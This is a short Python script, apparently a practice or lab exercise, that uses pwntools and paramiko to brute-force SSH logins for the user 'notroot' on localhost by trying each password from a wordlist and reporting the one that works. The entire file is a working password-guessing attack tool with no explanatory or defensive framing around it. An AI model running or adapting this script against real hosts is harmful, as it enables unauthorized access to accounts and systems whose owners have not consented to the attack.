from pwn import *
import paramiko

host = '127.0.0.1'
username = 'notroot'
attempts = 0

with open('ssh-wordlist.txt', 'r') as passs:
    for password in passs:
        password = password.strip('\n')
        try:
            print("[{}] attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print('[x] invalid password')
        attempts += 1
